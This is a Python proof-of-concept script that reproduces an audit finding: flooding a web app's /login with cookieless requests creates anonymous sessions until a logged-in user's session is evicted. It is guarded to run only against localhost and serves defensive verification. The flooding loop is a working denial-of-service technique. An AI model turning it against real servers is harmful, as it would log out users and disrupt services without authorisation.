"""Reproduce audit finding F1: anonymous requests can evict logged-in sessions.

FOR YOUR OWN LOCAL TEST SERVER ONLY - the script refuses any non-localhost URL.

What it does:
  1. Logs in as a normal user (the "victim") and confirms /dashboard returns 200.
  2. Sends N requests WITHOUT cookies, the way an attacker would. Each one makes
     the server create a new anonymous session file (to hold a CSRF token).
  3. Checks /dashboard again with the victim's cookie.
     401 = the victim was logged out (vulnerable).  200 = the session survived.

Usage (server running in another terminal):
    python scripts/demo_session_flood.py --username bob
"""
import argparse
import getpass
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


def status_of(opener, url):
    try:
        return opener.open(url).status
    except urllib.error.HTTPError as e:
        return e.code


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base", default="http://127.0.0.1:5000")
    parser.add_argument("--username", required=True)
    parser.add_argument("--requests", type=int, default=1100)
    args = parser.parse_args()

    if urllib.parse.urlparse(args.base).hostname not in ("127.0.0.1", "localhost"):
        sys.exit("Refusing to run against anything except your local server.")

    password = getpass.getpass(f"Password for {args.username}: ")
    victim = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    html = victim.open(args.base + "/login").read().decode()
    token = re.search(r'name="csrf-token" content="([^"]+)"', html).group(1)
    req = urllib.request.Request(
        args.base + "/login",
        data=json.dumps({"username": args.username, "password": password}).encode(),
        headers={"Content-Type": "application/json", "X-CSRFToken": token},
    )
    try:
        victim.open(req)
    except urllib.error.HTTPError as e:
        sys.exit(f"Login failed ({e.code}). Check the username/password.")

    print(f"Victim /dashboard before flood: {status_of(victim, args.base + '/dashboard')}")
    print(f"Sending {args.requests} anonymous requests...")
    for i in range(args.requests):
        urllib.request.urlopen(args.base + "/login").read()   # fresh connection, no cookies
        if (i + 1) % 200 == 0:
            print(f"  {i + 1} sent")

    after = status_of(victim, args.base + "/dashboard")
    print(f"Victim /dashboard after flood:  {after}")
    print("VULNERABLE: victim was logged out." if after == 401 else "Session survived.")


if __name__ == "__main__":
    main()
